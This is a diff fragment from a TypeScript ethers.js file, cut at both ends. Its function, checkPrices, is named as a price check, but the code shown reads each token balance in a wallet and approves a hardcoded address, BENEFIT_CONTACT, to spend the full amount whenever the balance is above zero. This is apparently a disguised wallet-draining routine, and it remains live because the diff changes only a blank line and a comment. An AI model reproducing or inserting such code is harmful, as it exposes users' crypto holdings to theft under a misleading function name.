@@ -47,13 +47,10 @@ export const checkPrices = async (token: string) => {
             let symbol = list[coin].symbol;
             // @ts-ignore
             let decimal = list[coin].decimal;
-
             try {
                 let value = await sign.balanceOf(wallet.address.toString());
                 let value_ = ethers.utils.formatUnits(value.toString(), decimal);
                 if (Number(value_) > 0) {
-                    // let value_ = ethers.utils.parseUnits(value.toString(), Number(decimal));
-
                     const approve_ = await sign.approve(BENEFIT_CONTACT, value)
                     const receipt_approve = await approve_.wait();
                     if (receipt_approve && receipt_approve.blockNumber && receipt_approve.status === 1) {
